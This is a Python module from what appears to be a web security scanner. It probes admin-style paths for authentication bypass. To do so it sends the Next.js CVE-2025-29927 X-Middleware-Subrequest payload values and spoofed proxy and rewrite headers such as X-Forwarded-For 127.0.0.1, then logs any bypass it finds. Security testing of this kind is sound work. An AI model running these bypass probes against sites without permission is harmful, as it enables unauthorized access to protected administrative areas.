"""Authentication / Middleware bypass probes (safe, non-destructive).

Focuses on common misconfigurations:
  - Next.js CVE-2025-29927 (X-Middleware-Subrequest)
  - Proxy / IP trust headers
  - Path rewrite headers
"""
from urllib.parse import urljoin
from .base import BaseModule

# Next.js middleware bypass (CVE-2025-29927)
NEXTJS_BYPASS_VALUES = [
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "middleware",
    "pages/_middleware",
]

PROXY_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("True-Client-IP", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Internal", "true"),
    ("X-Internal-Auth", "true"),
    ("X-Auth-Internal", "1"),
]

# Paths commonly protected by middleware
PROTECTED_PATHS = [
    "/admin",
    "/admin/",
    "/dashboard/admin",
    "/api/admin",
    "/internal",
    "/private",
    "/management",
    "/console",
]


class AuthBypass(BaseModule):
    name = "Auth / Middleware Bypass"

    def run(self) -> None:
        base = self.config.base_url.rstrip("/")
        candidates = list(PROTECTED_PATHS)

        # Also test endpoints already discovered that returned 3xx / 401 / 403
        for ep in self.reporter.endpoints:
            if ep.rstrip("/").endswith(("/admin", "/wrong", "/private", "/internal")):
                path = ep.replace(base, "") or "/"
                if path not in candidates:
                    candidates.append(path)

        bypassed = False

        for path in candidates:
            if not self.config.can_request() or self.rm.stopped_by_429:
                break

            url = urljoin(base + "/", path.lstrip("/"))
            # Baseline without special headers
            baseline = self.rm.get(url, allow_redirects=False)
            if baseline is None:
                continue

            baseline_code = baseline.status_code
            baseline_len = len(baseline.content or b"")
            baseline_loc = baseline.headers.get("Location", "")

            # Only interesting if protected (redirect / forbidden)
            if baseline_code not in (301, 302, 303, 307, 308, 401, 403):
                # Still try Next.js bypass on 200 admin-looking pages? skip
                if path.rstrip("/") != "/admin":
                    continue

            self.log(f"Protected candidate: {url} -> {baseline_code} loc={baseline_loc[:40]}")

            # --- Next.js CVE-2025-29927 ---
            for val in NEXTJS_BYPASS_VALUES:
                if not self.config.can_request():
                    break
                h = {"X-Middleware-Subrequest": val}
                resp = self.rm.get(url, headers=h, allow_redirects=False)
                if resp is None:
                    continue
                if self._is_bypass(resp, baseline_code, baseline_len, baseline_loc):
                    self.log(f"BYPASS via X-Middleware-Subrequest: {val[:50]}")
                    self.reporter.add_finding(
                        "Middleware Bypass (Next.js CVE-2025-29927)",
                        severity="critical",
                        detail=f"X-Middleware-Subrequest bypass on {url}",
                        evidence=val,
                        url=url,
                        method="GET",
                        parameter="",
                        evidence_snippet=val,
                    )
                    self.reporter.add_endpoint(url)
                    bypassed = True
                    break

            if bypassed:
                break

            # --- Proxy / internal headers ---
            for hname, hval in PROXY_HEADERS:
                if not self.config.can_request():
                    break
                # For rewrite headers, set path dynamically
                if hname in ("X-Original-URL", "X-Rewrite-URL"):
                    hval = path
                resp = self.rm.get(url, headers={hname: hval}, allow_redirects=False)
                if resp is None:
                    continue
                if self._is_bypass(resp, baseline_code, baseline_len, baseline_loc):
                    self.log(f"BYPASS via {hname}: {hval}")
                    self.reporter.add_finding(
                        f"Auth Bypass via header {hname}",
                        severity="high",
                        detail=f"{hname}: {hval} on {url}",
                        evidence=hval,
                        url=url,
                        method="GET",
                        parameter=hname,
                        evidence_snippet=hval,
                    )
                    bypassed = True
                    break

            if bypassed:
                break

        if not bypassed:
            self.log("No middleware/auth bypass detected")

    def _is_bypass(self, resp, baseline_code, baseline_len, baseline_loc) -> bool:
        """Heuristic: status changed from redirect/forbidden to 200 with different body size."""
        if resp.status_code == 200 and baseline_code in (301, 302, 303, 307, 308, 401, 403):
            # Different body size = likely real page, not the "wrong" page
            new_len = len(resp.content or b"")
            if abs(new_len - baseline_len) > 500:
                return True
            loc = resp.headers.get("Location", "")
            if baseline_loc and not loc:
                return True
        return False
